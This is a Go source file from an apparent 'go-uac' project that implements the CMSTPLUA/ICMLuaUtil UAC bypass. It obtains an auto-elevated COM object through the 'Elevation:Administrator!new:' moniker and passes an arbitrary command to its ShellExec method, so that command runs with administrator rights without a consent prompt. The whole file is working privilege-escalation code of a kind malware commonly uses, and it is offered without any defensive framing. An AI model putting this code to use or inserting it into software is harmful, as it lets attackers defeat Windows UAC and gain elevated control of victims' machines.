package method

import (
	"fmt"
	"go-uac/ole"
	"syscall"
)

func RunICMLuaUtil(szCmd string) error {
	if hr := ole.CoInitializeEx(0, 2); hr.IsFailed() {
		return hr
	}
	defer ole.CoUninitialize()

	bindOpts := &ole.BIND_OPTS3{
		ClassContext: 4,
	}

	icm, hr := ole.CoGetObject[*ole.ICMLuaUtil](
		fmt.Sprintf("Elevation:Administrator!new:%s", ole.CLSID_CMSTPLUA),
		bindOpts,
		ole.IID_ICMLuaUtil,
	)

	if hr.IsFailed() {
		return hr
	}

	defer icm.Release()

	lpFile, err := syscall.UTF16PtrFromString(string(szCmd))
	if err != nil {
		return err
	}

	return icm.ShellExec(lpFile, nil, nil, 0, syscall.SW_SHOW)
}
